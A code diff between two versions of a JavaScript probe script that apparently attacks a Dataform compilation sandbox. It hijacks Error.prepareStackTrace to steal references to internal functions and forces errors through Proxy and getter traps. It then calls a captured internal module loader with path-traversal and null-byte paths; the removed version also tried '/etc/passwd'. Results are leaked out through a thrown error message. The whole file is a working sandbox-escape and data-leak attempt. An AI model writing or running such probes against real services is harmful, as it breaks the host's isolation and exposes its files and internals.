@@ -1,4 +1,4 @@
-// v12 — walk caller chain via Function.caller; introspect captured functions deeply
+// v13 — dump EVERY callsite raw, look for inlined or anonymous bundle frames
 
 var out = {};
 function safe(k, fn) {
@@ -6,128 +6,140 @@ function safe(k, fn) {
   catch(e) { out[k] = 'ERR:' + (e.message || String(e)).substring(0, 400); }
 }
 
-globalThis.__capt = {};
+globalThis.__allFrames = [];
 Error.stackTraceLimit = Infinity;
 
 Error.prepareStackTrace = function(err, callSites) {
   try {
+    var frame = [];
+    frame.push('TAG:' + err.message);
     for (var i = 0; i < callSites.length; i++) {
       var cs = callSites[i];
       try {
-        var fn = cs.getFunction && cs.getFunction();
-        if (!fn || typeof fn !== 'function') continue;
-        var src = String(fn);
-        var key = (cs.getFileName && cs.getFileName() || '?') + ':' + (cs.getFunctionName && cs.getFunctionName() || '?') + ':' + src.length;
-        if (!globalThis.__capt[key]) {
-          globalThis.__capt[key] = { src: src, fn: fn };
+        var info = {
+          i: i,
+          file: cs.getFileName && cs.getFileName(),
+          fn_name: cs.getFunctionName && cs.getFunctionName(),
+          method: cs.getMethodName && cs.getMethodName(),
+          type: cs.getTypeName && cs.getTypeName(),
+          line: cs.getLineNumber && cs.getLineNumber(),
+          col: cs.getColumnNumber && cs.getColumnNumber(),
+          isEval: cs.isEval && cs.isEval(),
+          isNative: cs.isNative && cs.isNative(),
+          isToplevel: cs.isToplevel && cs.isToplevel(),
+          isConstructor: cs.isConstructor && cs.isConstructor(),
+          isAsync: cs.isAsync && cs.isAsync(),
+          evalOrigin: cs.getEvalOrigin && cs.getEvalOrigin(),
+          hasFn: !!(cs.getFunction && cs.getFunction()),
+        };
+        if (info.hasFn) {
+          var f = cs.getFunction();
+          info.fn_src_head = String(f).substring(0, 120);
+          // Store global for later
+          var key = (info.file || '?') + ':' + (info.fn_name || info.method || '?') + ':' + (cs.getLineNumber && cs.getLineNumber());
+          globalThis['__fn_' + i + '_' + err.message] = f;
         }
-      } catch(e) {}
+        frame.push(info);
+      } catch(e) { frame.push({err: e.message.substring(0,80)}); }
     }
+    globalThis.__allFrames.push(frame);
   } catch(e) {}
   return '';
 };
 
-// ============ Trigger multiple ERROR creation points ============
-safe('A', function() {
-  // Create error AT TIME of each interesting bundle function call
-  // 1. Inside publish() — pre-error
-  try { var p = publish('t1', { type: 'view' }); p.query('SELECT 1'); } catch(e) { e.stack; }
-  // 2. Force a compile error
-  try { global._DF_SESSION.compile(); } catch(e) { e.stack; }
-  // 3. Notebook with valid filename
-  // 4. resolve() with non-existent
-  try { global._DF_SESSION.resolve({name:'no_exist', schema:'a', database:'b'}); } catch(e) { e.stack; }
-  // 5. compileError directly
-  try { global._DF_SESSION.compileError(new Error('forced'), null); } catch(e) { e.stack; }
-  // 6. assertion
-  try { assert('test_assertion', 'SELECT 1'); } catch(e) { e.stack; }
-  // 7. operate
-  try { operate('test_op', 'CREATE TABLE x AS SELECT 1'); } catch(e) { e.stack; }
-  // 8. declare
-  try { declare({name: 'test_decl', schema: 'a'}); } catch(e) { e.stack; }
-  return 'fns_count=' + Object.keys(globalThis.__capt).length;
+// ============ Force errors with distinct TAGs ============
+safe('A_basic_throw', function() {
+  try { throw new Error('TAG_BASIC'); } catch(e) { e.stack; }
+  return 'ok';
 });
 
-// Force errors via mid-compile injection
-safe('B_throw_mid_compile', function() {
-  // Create a Proxy that throws on property access — install in actions
-  var trapProxy = new Proxy({}, {
-    get: function(t, p) { throw new Error('TRAP_' + String(p)); },
-    set: function(t, p, v) { throw new Error('TRAP_SET_' + String(p)); }
+safe('B_compile_with_proxy_proto', function() {
+  // Make a Proxy that throws when bundle accesses projectConfig.warehouse
+  var origPC = global._DF_SESSION.projectConfig;
+  global._DF_SESSION.projectConfig = new Proxy(origPC, {
+    get: function(target, prop) {
+      if (prop === 'warehouse') throw new Error('TAG_WAREHOUSE_GETTER');
+      return target[prop];
+    }
   });
-  // Replace one action's proto with the proxy
-  if (global._DF_SESSION.actions && global._DF_SESSION.actions.length > 0) {
-    var a = global._DF_SESSION.actions[0];
-    var origProto = a.proto;
-    Object.defineProperty(a, 'proto', { get: function() { throw new Error('PROTO_TRAP_DEEP'); } });
-    try { global._DF_SESSION.compile(); } catch(e) { e.stack; }
-    // restore
-    Object.defineProperty(a, 'proto', { value: origProto, writable: true, configurable: true });
-  }
-  return 'fns_count=' + Object.keys(globalThis.__capt).length;
+  try { global._DF_SESSION.compile(); } catch(e) { e.stack; }
+  // restore
+  global._DF_SESSION.projectConfig = origPC;
+  return 'ok';
 });
 
-// ============ Walk caller chain on captured functions ============
-safe('C_walk_caller_chain', function() {
-  var results = [];
-  for (var k in globalThis.__capt) {
-    var fn = globalThis.__capt[k].fn;
-    if (!fn) continue;
-    try {
-      var caller = fn.caller;
-      if (caller && typeof caller === 'function') {
-        results.push({k, caller_src: String(caller).substring(0, 200)});
+safe('C_publish_with_throwing_target', function() {
+  // Override projectConfig.assertionSchema getter to throw
+  var orig = global._DF_SESSION.projectConfig.assertionSchema;
+  Object.defineProperty(global._DF_SESSION.projectConfig, 'assertionSchema', {
+    get: function() { throw new Error('TAG_AS_GETTER'); },
+    configurable: true
+  });
+  try { assert('throw_test', 'SELECT 1'); } catch(e) { e.stack; }
+  // restore
+  Object.defineProperty(global._DF_SESSION.projectConfig, 'assertionSchema', { value: orig, writable: true, configurable: true });
+  return 'ok';
+});
+
+safe('D_compile_internal_throw_via_action_target', function() {
+  var p = publish('throwtgt', { type: 'view' });
+  p.query('SELECT 1');
+  // Make proto.target throw when accessed during compile
+  Object.defineProperty(p.proto, 'target', {
+    get: function() { throw new Error('TAG_TARGET_GETTER'); },
+    configurable: true
+  });
+  try { global._DF_SESSION.compile(); } catch(e) { e.stack; }
+  return 'ok';
+});
+
+// ============ Inspect all collected frames ============
+safe('E_dump_frame_count', function() {
+  return 'total_stacks=' + globalThis.__allFrames.length + ' total_frames=' + globalThis.__allFrames.reduce((s,f) => s + f.length, 0);
+});
+
+safe('F_dump_all_frames', function() {
+  return JSON.stringify(globalThis.__allFrames).substring(0, 3000);
+});
+
+// Search frame metadata for `?` file (bundle anonymous)
+safe('G_bundle_frames_search', function() {
+  var bundleFrames = [];
+  for (var stack of globalThis.__allFrames) {
+    for (var f of stack) {
+      if (f && f.file && f.file !== 'eval_test.js' && f.file !== '?' && f.fn_src_head) {
+        bundleFrames.push(f);
       }
-    } catch(e) {
-      results.push({k, err: e.message.substring(0,80)});
     }
   }
-  return JSON.stringify(results);
+  return JSON.stringify(bundleFrames.slice(0, 20));
 });
 
-safe('D_walk_arguments', function() {
-  var results = [];
-  for (var k in globalThis.__capt) {
-    var fn = globalThis.__capt[k].fn;
-    if (!fn) continue;
+// Walk a captured function's full source looking for inquire-like patterns
+safe('H_grab_g_call_stack_via_caller', function() {
+  // Find the g function reference
+  var gFn = null;
+  for (var k in globalThis) {
+    if (k.startsWith('__fn_') && globalThis[k] && String(globalThis[k]).indexOf('vm.compileModule') >= 0) {
+      gFn = globalThis[k];
+      break;
+    }
+  }
+  if (!gFn) return 'no g';
+  // Try to call g with reserved/special paths that might trigger different errors
+  var attempts = {};
+  for (var p of ['', '.', '/', '..', 'foo\x00bar', 'node_modules/protobufjs/minimal', '../node_modules/protobufjs/minimal', './node_modules/protobufjs', '../../node_modules/protobufjs', 'node_modules/@dataform/core/build/some-fake']) {
     try {
-      var args = fn.arguments;
-      results.push({k, has_args: args !== undefined ? args.length : 'none'});
+      var r = gFn(p);
+      attempts[p] = 'GOT keys=' + Object.keys(r||{}).slice(0,5).join(',');
     } catch(e) {
-      results.push({k, err: e.message.substring(0,80)});
+      attempts[p] = 'err:' + e.message.substring(0,80);
     }
   }
-  return JSON.stringify(results);
-});
-
-// ============ List all captured WITH their FULL src ============
-safe('E_dump_all', function() {
-  var summary = [];
-  for (var k in globalThis.__capt) {
-    summary.push({k, src_first_400: globalThis.__capt[k].src.substring(0, 400)});
-  }
-  return JSON.stringify(summary);
-});
-
-// ============ NEW ANGLE: bind a captured function with our `this` and see what changes ============
-safe('F_bind_invoke', function() {
-  // Try calling 'g' (require_bin) with crafted paths that might leak info
-  for (var k in globalThis.__capt) {
-    if (k.indexOf('require_bin.js:g') >= 0) {
-      var g = globalThis.__capt[k].fn;
-      // Try absolute paths
-      var attempts = {};
-      for (var p of ['/etc/passwd', 'protobufjs', 'protobufjs/minimal', 'protobufjs/inquire', 'fs', '@dataform/core', '../node_modules/.../', 'node_modules', '../../']) {
-        try { attempts[p] = 'GOT keys=' + Object.keys(g(p) || {}).slice(0,5).join(','); }
-        catch(e) { attempts[p] = 'err:' + e.message.substring(0,60); }
-      }
-      return JSON.stringify(attempts);
-    }
-  }
-  return 'no g captured';
+  return JSON.stringify(attempts);
 });
 
 Error.prepareStackTrace = undefined;
 
 module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
-throw new Error('PROBE_v12:' + JSON.stringify(out));
+throw new Error('PROBE_v13:' + JSON.stringify(out));
